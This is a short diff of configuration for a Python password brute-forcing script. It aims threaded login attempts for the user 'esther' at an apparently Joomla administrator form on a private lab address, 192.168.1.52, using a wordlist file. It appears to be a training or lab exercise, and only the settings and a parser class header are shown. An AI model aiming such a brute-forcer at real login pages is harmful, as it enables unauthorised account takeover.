@@ -13,18 +13,18 @@ from utils.wordList import build_wordlist
 
 user_thread = 10
 username = "esther"
-wordlist_file = "/tmp/cain.txt"
+wordlist_file = "/Users/evega/Documents/cice/pruebas/best110.txt"
 resume = None
 
 # target specific settings
 # form and php action target could be in different urls
-target_url = "http://192.168.1.52/administrator/index.php"
-target_post = "http://192.168.1.52/administrator/index.php"
+target_url = "http://192.168.1.52:8888/mysite/administrator/index.php"
+target_post = "http://192.168.1.52:8888/mysite/administrator/index.php"
 
 username_field = "username"
 password_field = "passwd"
 
-success_check = "Administration - Control Panel"
+success_check = "Control Panel"
 
 class BruteParser(HTMLParser):
     def __init__(self):
